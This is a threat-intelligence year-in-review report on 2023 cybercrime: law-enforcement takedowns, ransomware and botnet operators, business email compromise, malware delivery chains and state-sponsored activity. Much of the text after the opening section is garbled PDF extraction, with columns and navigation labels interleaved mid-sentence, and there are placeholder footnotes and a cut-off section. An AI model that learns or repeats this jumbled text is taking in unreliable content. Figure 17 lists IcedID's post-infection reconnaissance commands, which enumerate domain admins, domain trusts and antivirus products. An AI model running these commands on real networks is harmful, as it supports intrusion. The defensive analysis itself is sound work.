How much of a long-term impact all this activity will ultimately have remains to be seen. On the one hand, some ransomware groups appear to have continued to avoid attacking critical infrastructure organizations, as discussed above. This could be deliberate to avoid drawing law enforcement attention, but the U.S.'s focus[^20] on improving cybersecurity in critical infrastructure sectors may be paying rewards.

On the other hand, threat actors quickly regroup and adapt, particularly when operating in jurisdictions beyond the reach of the investigating bodies. Where there is no real risk of arrest, and asset seizure is difficult, the incentive to get out of the crime business altogether just is not there. Furthermore, economic sanctions, which appear to have particularly impacted the technology sector[^21], might even in some cases have the effect of driving some individuals out of employment and into cybercrime.

![Figure 10: Law enforcement action timeline 2023: January 16 (Hive ransomware infrastructure taken down by FBI), February 9 (U.S. and UK sanctions announced against TrickBot operators), March 24 (Breachforums admin arrested by FBI), April 4 (Genesis Market disruption and arrests), and June 16 (Mikhail Matveev, aka 'Wazawaka', Babuk operator indicted and sanctioned).](figure10.png)  
*Figure 10. Law enforcement action timeline 2023. (Source: Secureworks)*

---

### Genesis Market's Temporary Exodus

The takedown at the beginning of April 2023 of Genesis Market's clearnet website appeared to have an impact on user confidence, at least at first. However, despite the takedown attempt, Genesis Market remained functional on the Tor network, albeit with the speed limitations of hosting it on that network. It was clear that the 119 arrests associated with the takedown, conducted under the name of Operation Cookie Monster, targeted users of the Genesis Market, not the owners or admins.

While the restocking of logs initially paused for several weeks in late April, findings by CTU researchers indicated that the operators behind the market remained active, with 1,874 new logs added to the site in May. On April 4, the day of the clear web takedown, there were 468,275 logs stored on the clear website. On April 5, there were 468,480 stored on the Tor site (the data was almost the same as both domains pointed at the same servers). On June 6, the number of logs on the Tor site had increased to 471,284. However, given the impact that the arrests had on user confidence, that small increase does not necessarily mean that sales figures increased or even remained the same.

![Figure 11: Bar chart comparing logs on Genesis Market before and after the clearnet website takedown: 468,275 on clearnet (04/04/2023), 468,480 on Tor (05/04/2023), and 471,284 on Tor (06/06/2023).](figure11.png)  
*Figure 11. Logs on Genesis Market, before and after the Clearnet website takedown. (Source: Secureworks)*

This illustrates how law enforcement can disrupt clearnet activity but may find it harder to take down services hosted on the dark web. Nonetheless, the takedown had clearly sown distrust among users. Chatter on underground forums indicated that some users thought the re-emerged site was a honeypot for law enforcement. Some threat actors were clearly concerned and looking for alternatives. Others may have been deterred by performance problems caused by the custom Genesium Browser and extension needing to communicate with command and control (C2) infrastructure over Tor. The takedown may also have spooked the site owners as, shortly afterwards, in June, they took the Tor site down and sold it to an undisclosed buyer.

---

### What Made Genesis Market So Popular?

Unlike other marketplaces that typically sell static stolen data, the Genesis Market operates a unique, highly functional, and easy to use “bot” system. This is a dynamic system that continually updates victim information. This includes capturing changes to passwords and any new sites the victim accesses.

In Genesis Market terminology, the term “bot” is used to refer to malware that constantly updates the market and stolen data, which can include anything from login details to cookies and digital fingerprints.

When a buyer purchases a bot, they are provided with two options to exploit the stolen data. They can either use a plugin designed for their existing web browser or use a dedicated Chromium-based browser. Both options allow the buyer to impersonate the victim with their stolen data, with the system handling most of the complexity. This makes it very easy for criminals to use the illicit access that has been obtained. Both options come with anti-detection features to help the buyer evade security systems.

In contrast, markets like the Russian Market typically sell traditional stealer logs. These logs are raw dumps of stolen information, including passwords, cookies, credit card numbers, and personal identification details, among other sensitive data. However, they do not offer any specialized software for making these logs instantly usable. Buyers will have to manually configure their systems to utilize the stolen data or use clear-text usernames and passwords directly. This makes the process more labor-intensive and technically demanding for buyers than Genesis Market's approach.

---

### BreachForums Breached

After operating for a year, BreachForums, the natural successor to RaidForums, which was itself taken down in February 2022, was targeted in March 2023 in a concerted law enforcement operation led by the FBI. This resulted in the arrest of the owner and administrator of the site, Conor Brian Fitzpatrick[^22], who used the alias “Pompompurin.” Fitzpatrick pled guilty[^23] to hacking and child pornography possession charges. A second administrator “Baphomet” subsequently announced that the site would be permanently closed after expressing concern that some of the backend servers might have been placed under law enforcement control. On June 19, the administrator from a rival forum claimed that they had compromised a new BreachForums site, set up by the ShinyHunters threat group with Baphomet. Following this attack, the new BreachForums database was reportedly leaked across several platforms, including Telegram.

---

### Hive Ransomware Infrastructure Hived Off

It was not just underground forums and marketplaces that were disrupted by law enforcement activity this year. In January 2023, an international operation[^24], led by the FBI in coordination with Dutch and German law enforcement agencies, targeted the infrastructure associated with the Hive ransomware-as-a-service (RaaS), operated by GOLD HAWTHORNE. Websites and servers that members of the group used to communicate with each other were seized, resulting in a disruption that led to the apparent demise of Hive. Since July 2022, the FBI had allegedly gained access to the group's network, seized decryption keys, and issued them to victims of the ransomware-as-a-service (RaaS) scheme. This activity clearly denied the individuals behind the scheme criminal profits while easing the pain of its many victims.

---

### TrickBot Members Sanctioned

*(Section text cuts off in source material)*

---

### Romcom RAT Blurs the Lines

The war in U

---

[^1]: Footnote reference in original report.
[^2]: Footnote reference in original report.
[^3]: Footnote reference in original report.
[^4]: Footnote reference in original report.
[^5]: Footnote reference in original report.
[^6]: Footnote reference in original report.
[^7]: Footnote reference in original report.
[^8]: Footnote reference in original report.
[^9]: Footnote reference in original report.
[^10]: Footnote reference in original report.
[^11]: Footnote reference in original report.
[^12]: Footnote reference in original report.
[^13]: Footnote reference in original report.
[^14]: Footnote reference in original report.
[^15]: Footnote reference in original report.
[^16]: Footnote reference in original report.
[^17]: Footnote reference in original report.
[^18]: Footnote reference in original report.
[^19]: Footnote reference in original report.
[^20]: Footnote reference in original report.
[^21]: Footnote reference in original report.
[^22]: Footnote reference in original report.
[^23]: Footnote reference in original report.
[^24]: Footnote reference in original report.

---

kraine has not permanently damaged the
cybercriminal landscape as originally hoped but third-party
In the case of TrickBot, people rather than infrastructure were
researchers and the media have asked questions25 about
targeted. In February 2023, seven individuals associated with the whether it has blurred the lines between cybercrime and
Executive Summary
02 activities surrounding the development and deployment of TrickBot nation-state activity. GOLD FLAMINGO, operators of the
and Key Findings
malware were jointly sanctioned by the UK Foreign, Commonwealth Cuba ransomware, has been accused of performing espionage
activities alongside moneymaking.
and Development Office (FCDO) and the U.S. Department of the
Treasury's Office of Foreign Assets Control (OFAC). The group, The group was reported26 in August 2022 to have deployed
The Business of Cybercrime—
03
which we track as GOLD BLACKBURN, was heavily embedded with the RomCom RAT alongside Cuba ransomware in an intrusion.
Is Boomtime Back?
the operators of the now defunct Conti ransomware scheme, an CERT-UA subsequently saw RomCom RAT used against
government and military targets in Ukraine27.
especially prolific and sophisticated criminal enterprise operated by
GOLD ULRICK. The aim of these sanctions is to prohibit individuals
Innovations in TTPs Occur
04 When Infection Chains Are or organizations in the UK and U.S. from having dealings with the
Forced to Evolve listed entities, including making or facilitating payments to them.
Laundering the seven individuals' proceeds of crime might be harder
as a result, impacting their ability to realize their profits. It follows
State-Sponsored OFAC placing its first sanction on a virtual currency mixer in May
05
Threat Activity
2022, due, on that occasion, to the mixer's involvement in facilitating
money laundering for the North Korean regime.
Figure 12. GOLD FLAMINGO's Cuba ransomware leak site, which at the
time of publication had posted its most recent victim on July 11, 2023.
Threat Actor Use of
06 Law enforcement agencies have long come up against issues of (Source: Secureworks)
Artificial Intelligence
jurisdiction, which not only impede the ability to identify specific
individuals involved in a cybercriminal operation, but also shield them The number of named Cuba ransomware victims dropped off
throughout the year following the invasion of Ukraine. After a
from arrest. These latest attempts at disruption versus prosecution
07 Conclusion brief surge in late 2022, no victims were named at all for the
are a possible attempt to address that. If you can't prosecute threat
first four months of 2023. It is possible that the group has
actors, you can at least frustrate their activities and hamper their
instead been actively engaged in undertaking operations on
ability to make and spend money, travel internationally, or leave behalf of the Russian State, but it is also feasible they do not
08 Appendix
Russia at all. have exclusive use of the RomCom RAT, and another group
has conducted those operations. It does not appear that Cuba
ransomware itself has been deployed against these Ukrainian
targets, and there is still no smoking gun evidence about
routine collusion between ransomware groups and Russian
intelligence operations.
2023 State of the Threat: A Year in Review 30

Chinese Cybercrime Activity Another possible example of a financially motivated Chinese group
01 Letter From Our VP
is GOLD BARONDALE. The group leveraged a DNS logging platform
A very high proportion of the ransomware activity that CTU in a November 2022 attack we observed that has previously been
researchers observe emanates from cybercriminals based in either associated with Chinese state-sponsored groups. This attack was
Executive Summary
02 Russia or its CIS neighbors. However, there are exceptions. Over frustrated before the attackers achieved their goals on the network,
and Key Findings
the past year, we have observed cybercriminal attacks conducted so we cannot say for sure whether it was financially motivated, but
by financially motivated threat groups that are likely Chinese. One the targeting was not typical of cyberespionage activity.
group is particularly noteworthy: GOLD FIESTA.
The Business of Cybercrime—
03 Both groups commonly use open-source tools and techniques
Is Boomtime Back?
CTU analysis of GOLD FIESTA intrusion activity, which was primarily associated with Chinese-language security research, in
observed during several incident response engagements that took common with many Chinese state-sponsored espionage groups
place in February 2023, identified clear overlap with Hello, Cring, such as BRONZE UNIVERSITY and BRONZE ATLAS. It would be
Innovations in TTPs Occur
04 When Infection Chains Are and Rapture ransomware precursor activity. For example, we saw unsurprising for groups to prefer tools and techniques covered in
Forced to Evolve the use of a rare set-alias command for the PowerShell Invoke- open-source research written in their native language. It is even
Expression cmdlet that is associated with Chinese-language possible that there is some overlap in personnel between groups,
research on antivirus evasion that was also observed in Rapture as with the charges29 levied in the U.S. in 2020 against BRONZE
State-Sponsored activity in 2023, and Hello and Cring activity in 2021. It appears ATLAS members.
05
Threat Activity probable that GOLD FIESTA developed and deployed these and
likely other ransomware families.
Threat Actor Use of GOLD FIESTA likely used scan-and-exploit against SharePoint
06
Artificial Intelligence
server vulnerabilities to gain access in the February 2023 intrusions,
as it has done in previous attacks. Third-party observations28 of
Hello precursor activity identified the IAV as the exploitation of the
07 Conclusion
SharePoint vulnerability CVE-2019-0604.
08 Appendix
2023 State of the Threat: A Year in Review 31

Iranian Ransomware for Revenue  in May 2022, having responded to multiple incidents involving
01 Letter From Our VP
COBALT MIRAGE activity. Despite this and other public reports on
this group, attacks continued, likely driven both by their freedom to
Ransomware is routinely used by Iranian state-sponsored threat
operate this criminal enterprise and the intent to make money for
groups as a disruptive tool in targeted attacks, often against
Executive Summary
02 themselves. While sufficiently competent to quickly fold publicly
regional adversaries, particularly Israel. However, one Iranian group
and Key Findings
disclosed vulnerabilities and proof of concept code into their
has stood out in their use of ransomware style attacks resulting
operations, they were not adept at covering their tracks.
from a financial, rather than political, motive.
The Business of Cybercrime—
03 On September 14, 2022, Secureworks published30 a detailed report
| Is Boomtime Back? COBALT MIRAGE has been operating since at least June 2020,  |     |     |
| ----------------------------------------------------------------------------- | --- | --- |
providing credible technical evidence (see figure 13) linking the
conducting opportunistic intrusions using scan-and-exploit
COBALT MIRAGE activity to several individuals: Ahmad Khatibi,
tactics and following up with ransomware attacks using Microsoft
CEO of Afkar System Co. and Mansour Ahmadi, CEO of Najee
| Innovations in TTPs Occur  Bitlocker and the open source DiskCryptor encryption solution.  |     |     |
| ------------------------------------------------------------------------------------------ | --- | --- |
Technology, as well as a third entity known as Secnerd, also linked
| 04 When Infection Chains Are  CTU researchers initially publicly reported on this group's activity  |     |     |
| --------------------------------------------------------------------------------------------------- | --- | --- |
Forced to Evolve to Mansour Ahmadi.
| State-Sponsored   | File Name | : Hi.pdf |
| ----------------- | --------- | -------- |
|                   | Directory | : .      |
05
| Threat Activity       | File Size                   | : 39 kB                     |
| --------------------- | --------------------------- | --------------------------- |
|                       | File Modification Date/Time | : 2021:12:17 08:55:00+00:00 |
|                       | File Access Date/Time       | :                           |
|                       | File Inode Change Date/Time | :                           |
|                       | File Permissions            | : rwxr-xr-x                 |
| Threat Actor Use of   | File Type                   | : PDF                       |
06
| Artificial Intelligence | File Type Extension | : pdf                       |
| ----------------------- | ------------------- | --------------------------- |
|                         | MIME Type           | : application/pdf           |
|                         | PDF Version         | : 1.7                       |
|                         | Linearized          | : No                        |
|                         | Page Count          | : 1                         |
| 07 Conclusion           | Language            | : en-US                     |
|                         | XMP Toolkit         | : 3.1-701                   |
|                         | Producer            | : Microsoft Word 2019       |
|                         | Creator             | : ahmad khatibi             |
|                         | Creator Tool        | : Microsoft® Word 2019      |
| 08 Appendix             | Create Date         | : 2021:12:17 23:54:22+03:30 |
|                         | Modify Date         | : 2021:12:17 23:54:22+03:30 |
|                         | Document ID         | : uuid:                     |
|                         | Instance ID         | : uuid:                     |
|                         | Author              | : ahmad khatibi             |
Figure 13. Document metadata revealed the identity of an individual linked to COBALT MIRAGE ransomware activity (Source: Secureworks)
2023 State of the Threat: A Year in Review 32

Later that day the U.S. Department of Justice issued31 an Since the September publications, COBALT MIRAGE ransomware
01 Letter From Our VP
indictment for both Ahmad Khatibi and Mansour Ahmadi, and a activity appears to have ceased. However, it is likely that the
third individual, Amir Hossein, in relation to attacks on hundreds of individuals involved continue to work on other projects.
victims in the U.S. including a children's hospital.
Executive Summary
02
and Key Findings
The U.S. Department of the Treasury sanctioned32 the same three
individuals and seven others, and a joint cybersecurity advisory was
published based on work from multiple Five Eyes agencies. The
The Business of Cybercrime—
03 publication referred to these individuals as Islamic Revolutionary
Is Boomtime Back?
Guard Corp (IRGC) affiliated actors. It is unclear to what degree
the ransomware activity was IRGC-directed or whether it was a
side-activity alongside work that was performed for the IRGC. A
Innovations in TTPs Occur
potential operational model is illustrated below.
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity Islamic Revolutionary Guard Corps Intelligence
Organization (IRGC-IO)
Tasks
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
Support COBALT
Najee Technology & Secnerd Afkar System
MIRAGE Operations
08 Appendix
Figure 14. Potential relationships between Najee, Secnerd, Afkar System, and the IRGC-IO. (Source: Secureworks)
2023 State of the Threat: A Year in Review 33

Business Email Compromise— Threat actors use a range of techniques including mass phishing
01 Letter From Our VP
campaigns to steal credentials which are then used to access the
a Persistent Problem
victim email account. Once they have access, they often monitor
the activity of the email account, identifying email chains with
Executive Summary Business email compromise (BEC) is one of the most financially
02 vendors and suppliers in which they can insert themselves. After the
and Key Findings damaging online crimes overall for organizations. It exceeds even
attacker has successfully initiated communication with the victim,
ransomware in aggregate, mainly because it is so prolific, even if
they provide modified legitimate financial documents or payment
individual financial losses from BEC may be lower than individual
instructions for the victim to send money to the attacker-controlled
The Business of Cybercrime— losses from ransomware. The FBI estimates33 that in 2022 alone, it
03 accounts. Attackers may also spoof victim organizations to request
Is Boomtime Back?
received complaints about 21,832 BEC attacks, resulting in adjusted
payment without first compromising a victim's email account. This
losses in the U.S. of over $2.7 billion USD, an increase from $2.4
variation is referred to as Business Email Spoofing or CEO fraud.
billion USD in 2021. In contrast, the FBI received 2,385 complaints
Innovations in TTPs Occur
about ransomware attacks in the U.S. in 2022 that resulted in
Over the course of the year, CTU researchers have observed threat
04 When Infection Chains Are
estimates for adjusted losses of approximately $34.3 million.
Forced to Evolve actors employing a range of different methods to capture credentials
However, individuals and organizations may be more motivated
and facilitate BEC fraud. These have included the use of offline
to report BEC than ransomware attacks to the FBI which could
HTML login pages to circumvent detections that look for malicious
somewhat skew these figures.
State-Sponsored executables or documents that auto-forward users to fake login
05
Threat Activity pages. Threat actors have also been observed employing a variety
Most BEC incidents involve a threat actor intercepting an email chain
of tactics to bypass multi-factor authentication (MFA) including
and impersonating one of the participants to convince the victim to
social engineering to convince a victim to approve an authentication
modify details of a legitimate payment to redirect it to an attacker-
Threat Actor Use of request and, less frequently, MFA fatigue attacks which send many
06
Artificial Intelligence controlled bank account rather than the intended recipient. authorization requests in quick succession. Once a victim approves a
malicious MFA request, the threat actor can add their own device to
a list of approved devices to maintain persistence.
07 Conclusion
08 Appendix
2023 State of the Threat: A Year in Review 34

In one compromise analyzed by Secureworks incident responders, Organizations can mitigate BEC attacks by comprehensively
01 Letter From Our VP
a threat actor gained access because an employee approved implementing MFA across all user accounts, including those for
a malicious MFA request and did not report the incident. Once senior executives. But remember that not all MFA solutions are
authenticated, the threat actor added their device to a list of created equal; using an authenticator app is better than SMS,
Executive Summary
02 approved MFA devices. The threat actor leveraged this access to and number matching is an improvement on click-to-accept, and
and Key Findings
monitor the victim's emails for an extended period without detection. represents a meaningful mitigation to MFA fatigue. It is advisable
They then launched a successful attack to reroute a scheduled to closely follow Microsoft's Outlook authentication guidance to
payment. In other incidents, threat actors were able to circumvent continually adopt best practices. Training employees not to accept
The Business of Cybercrime—
03 MFA completely. In one such case, thanks to non-configured MFA requests they did not generate is also a useful exercise. Robust
Is Boomtime Back?
Conditional Access policies, the threat actor was able to gain business processes such as two-person payment processing,
access without involving MFA. In another, the presence of legacy telephone-only approvals, and telephone-only vendor checks are
authentication methods on the system allowed the threat actor to essential.
Innovations in TTPs Occur
bypass MFA and still gain access.
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
08 Appendix
2023 State of the Threat: A Year in Review 35

04
01 Letter From Our VP Innovations in TTPs Occur
When Infection Chains
Executive Summary
02
and Key Findings
Are Forced to Evolve
The Business of Cybercrime—
03
Is Boomtime Back?
Innovations in TTPs Occur
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
08 Appendix
2023 State of the Threat: A Year in Review 36

When Microsoft Disabled Macros containers is the Windows Shortcut, or LNK files, which can execute
01 Letter From Our VP
additional files within the container using command line parameters,
Macro-enabled Office documents have been a mainstay of malware as necessary.
distribution campaigns for many years. That started to slow down
Executive Summary
02 when Microsoft announced34 substantive action against this threat For example, the DarkTortilla crypter35 is typically delivered by emails
and Key Findings
with a logistics lure and includes the malicious payload in an archive
in early 2022. Microsoft revealed they would begin blocking macros
attachment with file types such as .iso, .zip, .img, .dmg, and .tar.
from executing by default in documents downloaded from the
In one campaign that CTU researchers investigated, the redacted
Internet, as indicated by the mark-of-the-web (MotW) metadata
The Business of Cybercrime—
03 filename of the attached ISO image archive file (.iso) included the
added by Windows to downloaded files. After a false start in early
Is Boomtime Back?
name of the organization from which the email was purportedly sent.
June 2022, the change was made permanent in Office products in
late July, reducing the impact of this malware delivery mechanism in
one fell swoop.
Innovations in TTPs Occur
04 When Infection Chains Are
Forced to Evolve The change forced threat actors to adopt alternative infection chains
to keep phishing success rates up. CTU researchers have observed
an increase in the number of spam campaigns relying on container
State-Sponsored payloads—such as ISO, IMG, and VHDX—to deliver malware. These
05
Threat Activity file types are opened natively by modern Windows versions and are ISO
presented to users as a folder opened within the familiar Explorer
interface, where they can navigate to the malicious files found
Threat Actor Use of
06 within. The most common type of malicious file located in these LNK
Artificial Intelligence
ZIP
07 Conclusion
DLL
08 Appendix
Figure 15. Common file extensions used in attacks. (Source: Secureworks)
2023 State of the Threat: A Year in Review 37

that CTU researchers observed in May 2023, emails included ZIP
01 Letter From Our VP
archive attachments that contained PDF files. Clicking on the PDF
took victims first to a gateway page that performed checks on the
victim's system and then to a prompt to download an obfuscated
Executive Summary
02 VBS file from the MEGA cloud file-sharing site.
and Key Findings
Threat actors have also increasingly turned to the use of malicious
Microsoft OneNote files to deliver payloads such as the RedLine
The Business of Cybercrime—
03 information stealer, Qakbot, or IcedID. CTU researchers observed
Is Boomtime Back?
two infection chains used by unknown threat actors from January
12 to January 18, 2023, to deliver RedLine. In both cases, the
victim received a OneNote file attachment. Opening it revealed
Innovations in TTPs Occur
a blurred image which recipients were invited to click. This image
04 When Infection Chains Are
Forced to Evolve was underlaid with multiple copies of a malicious script. Executing
the script generated a pop-up warning. If the victim dismissed the
warning, the script launched a BAT file, copied a PowerShell binary to
State-Sponsored a new location, and executed a PowerShell command that decrypted,
05
Threat Activity decompressed, and executed the RedLine payload.
Figure 16. DarkTortilla malspam containing malicious archive attachment.
Threat actors evolved their use of OneNote files over the following
(The German text translates to “Good morning, Please give us your best
Threat Actor Use of price offer for our attached order. Awaiting your kind reply. Kind regards.”) months to avoid detection. In a campaign that delivered Qakbot, the
06 (Source: Secureworks)
Artificial Intelligence OneNote attachment contained an embedded HTML Application
(HTA) file (Open.hta) that downloaded and executed the Qakbot
payload. In further campaigns to deliver IcedID, a threat actor used
Many techniques have remained the same, including the use of
07 Conclusion a similar approach to the Qakbot campaign, leveraging modified
ZIP archives to encapsulate delivered files. Less common formats
HTA code to launch obfuscated VBScript code that launched a
such as RAR and ACE are seen on occasion but suffer from
PowerShell command to download and execute the payload. CTU
08 Appendix Windows' inability to open these files without third-party utilities
researchers have investigated several intrusions that ultimately led to
installed. Similarly, active content such as executable, script files,
Black Basta ransomware deployment where OneNote files were used
and shortcut links remain popular. JavaScript, VBS, and Windows
to deliver Qakbot.
batch files are the most commonly observed script types observed
in attacks. In one phishing campaign to deliver the Remcos RAT
2023 State of the Threat: A Year in Review 38

Botnets—Some Flourish, At approximately the same time as the DLL began neutralizing
01 Letter From Our VP
infections, CTU researchers observed GOLD LAGOON's backend
Others Decline
infrastructure had stopped responding and some infrastructure had
been replaced. To interact with infected hosts, the replacement
Executive Summary The past year saw the continued decline of the large-scale, long-
02 servers required a certificate that can sign messages. Such efforts
and Key Findings lived botnets favored by cybercriminals for the past decade and a
will make it very hard for GOLD LAGOON to reimplement Qakbot.
half. The Conti leaks fallout of March 2022 expedited the downfall of
both the TrickBot and Bazar botnets, previously operated by GOLD
Qakbot posed a significant threat to businesses globally. Engineered
The Business of Cybercrime— BLACKBURN. The last year also saw GOLD CRESTWOOD's prolific
03 for eCrime, Qakbot infections led to the deployment of some of
Is Boomtime Back?
Emotet botnet, whose association with the Conti ransomware
the most sophisticated and damaging ransomware variants. These
operation was revealed in the Conti leaks, largely sidelined by its
included Conti, ProLock, Egregor, REvil, MegaCortex, and, more
operators for unknown reasons, despite several signals that they
recently, Black Basta, and collectively resulted in losses to businesses
Innovations in TTPs Occur
intended to return it to its former prevalence. For example, in
in the hundreds of millions of U.S. dollars. The takedown is a
04 When Infection Chains Are
October GOLD CRESTWOOD implemented functionality in their
Forced to Evolve welcome intervention.
Emotet malware that was likely intended to identify researcher
systems and malware sandboxes. However, on November 11, it took
By contrast, the IcedID botnet flourished in the past year, having long
a four-month hiatus, only returning for a brief burst of spamming in
State-Sponsored dispensed with its original purpose of facilitating banking fraud to
05 March that lasted until early April.
Threat Activity instead provide initial access to a variety of ransomware-distributing
threat groups. IcedID is used to deliver additional malware which can
At the end of August 2023, we also saw the demise of GOLD
lead to ransomware deployment; its operator, GOLD SWATHMORE,
LAGOON’s Qakbot. Thanks to the concerted international law
Threat Actor Use of functions as an initial access broker (IAB), selling access to
06
Artificial Intelligence enforcement Operation Duck Hunt36, led by the FBI, the botnet compromised systems to numerous ransomware operators. In one
was rendered inoperable. At 23:27 UTC on August 25, we observed
IcedID infection, which CTU researchers executed in a sandboxed
the successful takedown through our botnet emulator, detecting
environment simulating a corporate network, the threat actor
07 Conclusion the Qakbot botnet distributing shellcode to infected devices. The deployed Cobalt Strike Beacon 21 hours after the initial compromise.
shellcode unpacked a custom DLL (dynamic link library) executable
IcedID took an unusual hiatus between May 12 and June 7 but has
containing code that cleanly terminates the running Qakbot process
been active during most of the rest of the reporting period.
08 Appendix on infected hosts. The takedown was conducted in such a way that
Qakbot will not run if the host is restarted.
2023 State of the Threat: A Year in Review 39

IcedID Communications establishes a connection. It then requests available updates, new
01 Letter From Our VP
C2 servers, and additional commands for execution. IcedID is
IcedID is distributed as a loader executable that transmits basic typically instructed to execute several system and network profiling
system profile information to a first-stage loader C2 server. This commands shortly after infection. The output of these commands
Executive Summary
02 loader C2 server delivers the encrypted core IcedID module to is transmitted to a C2 server. GOLD SWATHMORE and its affiliates
and Key Findings
compromised hosts that meet infection criteria as determined use the data to identify high-value hosts that receive additional
by the IcedID backend. The downloaded core IcedID module is commands or malware payloads.
decrypted, saved to disk, loaded into memory, and executed. The
The Business of Cybercrime—
03
malware cycles through several hard-coded C2 servers until it
Is Boomtime Back?
Innovations in TTPs Occur
04 When Infection Chains Are
Forced to Evolve
State-Sponsored > net group Domain Admins /domain
05
Threat Activity
> net view /all
> net view /all /domain
> nltest /domain_trusts /all_trusts
Threat Actor Use of
06 > nltest /domain_trusts
Artificial Intelligence
> net config workstation
> systeminfo
07 Conclusion > ipconfig /all
> cmd.exe /c chcp >&2
> WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get
08 Appendix > /Format:List
Figure 17. System and network profiling commands executed by IcedID shortly after infection. (Source: Secureworks)
2023 State of the Threat: A Year in Review 40

Despite some functional “improvements,” such as Qakbot's addition SocGholish lurks on compromised WordPress sites and masquerades
01 Letter From Our VP
of the ability to capture screenshots on newly infected systems, the as an important software update for web browsers. Potential victims
sophistication level of these botnets has stagnated for years. This are carefully selected based on their geolocation and the profile of
reflects their new simplified mission of establishing a beachhead on their system including its membership within an Active Directory
Executive Summary
02 corporate networks to be quickly used for ransomware delivery. Many network. These factors are used by threat actors to identify high-
and Key Findings
botnets have abandoned the so-called consumer space entirely in value victims earlier in the kill chain.
recent years by refusing to execute malware in any environment
where the infected system is not joined with an Active Directory
The Business of Cybercrime—
03 domain (see figure 18).
Is Boomtime Back?
Drive-By Downloads
Innovations in TTPs Occur
04 When Infection Chains Are Drive-by downloads are malicious files unexpectedly delivered
Forced to Evolve through a web browser, either when the victim was not expecting to
download a file at all, or when the file that they intended to download
turned out to have been modified to execute malicious code. The
State-Sponsored last six quarters of Secureworks incident response data shows a
05
Threat Activity steady increase in drive-by downloads as an initial access vector
(IAV). CTU researchers have witnessed a surge in the past year in
drive-by downloads used as an initial access vector for ransomware
Threat Actor Use of attacks. Two large-scale threats delivering these downloads are
06
Artificial Intelligence
SocGholish and Gootloader. Both threats convince a potential victim
into downloading a JavaScript file that profiles their local system and Figure 18. Malicious SocGholish JavaScript injected into compromised
websites. (Source: Secureworks)
contacts a C2 server for additional malware to execute.
07 Conclusion
08 Appendix
2023 State of the Threat: A Year in Review 41

Gootloader similarly lurks on compromised WordPress sites and relies From late 2022, the Gootloader operator GOLD ZODIAC was widely
01 Letter From Our VP
on a vast network of SEO poisoned search phrases, in many cases reported37 to have updated their code. CTU researchers saw it
law-themed, to drive victims towards their malware. On numerous delivering the second stage payload as a PowerShell script earlier in
occasions in 2022, CTU researchers observed Gootloader drive-by the year. For example, in one engagement worked by Secureworks
Executive Summary
02 download compromises resulting in the delivery of Cobalt Strike. The incident responders, a user downloaded a ZIP file disguised as
and Key Findings
Gootloader code was buried within a large, legitimate but trojanized safety information, resulting in Gootloader delivery. Examination of
JavaScript jQuery file. If the infected host was joined to an Active the victim's logs revealed PowerShell execution before hands-on
Directory domain, Gootloader attempted to retrieve and execute a keyboard activity involving Cobalt Strike took place.
The Business of Cybercrime—
03 second-stage script containing a payload such as Cobalt Strike and a
Is Boomtime Back?
small DLL to load the payload. Gootloader has also reportedly38 been introducing long execution
delays by means of code loops that mean a victimized system
does not display artifacts of infection until hours or days after initial
Innovations in TTPs Occur
compromise.
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
Threat Actor Use of
06
Artificial Intelligence
07 Conclusion
Figure 19. Encoded payload written to registry key by Gootloader second-
stage script. (Source: Secureworks)
08 Appendix
Figure 20. Decoded and formatted PowerShell command from script delivered
by Gootloader reflectively loading DLL from registry. (Source: Secureworks)
2023 State of the Threat: A Year in Review 42

05
State-Sponsored
01 Letter From Our VP
Threat Activity
Executive Summary
02
and Key Findings
While many other countries, including India and Pakistan, conduct
The Business of Cybercrime—
03 hostile state-sponsored cyber activity, CTU researchers primarily
Is Boomtime Back?
focus on China, Russia, Iran, and North Korea as they cause the most
impact to our clients. The primary driver of state-sponsored threat
group activity on the part of these countries (and others) continues
Innovations in TTPs Occur
04 When Infection Chains Are to be geopolitical considerations.
Forced to Evolve
In particular, the war in Ukraine has been the main focus of Russian
activity. China too has shifted part of its attention towards Eastern
State-Sponsored Europe, although Taiwan and China's near neighbors remain a
05
Threat Activity preoccupation. Iran has maintained its focus on dissident activity,
its attempts to hinder the progress of the Abraham Accords across
Arab neighbors, and on Western intentions towards renegotiations
Threat Actor Use of of nuclear accords. As well as cyberespionage, North Korea remains
06
Artificial Intelligence
intent on revenue generation, targeting multiple countries to do so.
07 Conclusion
08 Appendix
2023 State of the Threat: A Year in Review 43

01 Letter From Our VP
Executive Summary
02
and Key Findings
The Business of Cybercrime—
03
Is Boomtime Back?
Innovations in TTPs Occur
04 When Infection Chains Are
Forced to Evolve
State-Sponsored
05
Threat Activity
CHINA
Threat Actor Use of
06 A Strategic Threat
Artificial Intelligence
Main motivations:
07 Conclusion Espionage
Intellectual Property
Theft
08 Appendix
2023 State of the Threat: A Year in Review 44

01 Letter From Our VP
CHINA
Executive Summary
02
Chinese threat groups are placing a growing emphasis on stealthy CTU researchers have observed Chinese threat actors using
and Key Findings
tradecraft to achieve their objectives in cyberespionage attacks. The commercial tools such as Cobalt Strike to minimize the risk of
three pillars of this tradecraft are the use of proxy infrastructure, attribution if they are caught and to blend in with post-intrusion
The Business of Cybercrime— living off the land through using native operating system tools, and ransomware groups that often use these tools. Some Chinese threat
03
Is Boomtime Back? the ability to adapt their approach as potential target organizations groups also appear to adjust tradecraft when returning to a target
increasingly move to cloud-based solutions. network after previously being evicted, showing they are adaptable
and goal-oriented. On some occasions, they may also focus their
Innovations in TTPs Occur exploitation on non-Windows devices, where EDR agents may be
04 When Infection Chains Are less likely to be deployed.
Chinese Cyberespionage
Forced to Evolve
Tradecraft Stresses Operational
CTU researchers have increasingly observed Chinese threat groups
demonstrating careful consideration for operational security over the
Security and Stealth
State-Sponsored
05 past few years including the use of living off the land tools and a C2
Threat Activity
proxy network built on compromised SOHO routers. This consistent
Chinese threat groups have in the past had a reputation for
attention to operational security also includes leaving a minimal
“smash-and-grab” intrusions, where the emphasis was on achieving
intrusion footprint and incorporating defense evasion techniques.
Threat Actor Use of objectives on the network as quickly as possible with little
06 This focus doesn't just contrast with China's historical reputation,
Artificial Intelligence consideration for detection and attribution. However, a growing
it also demonstrates a heightened level of operational maturity and
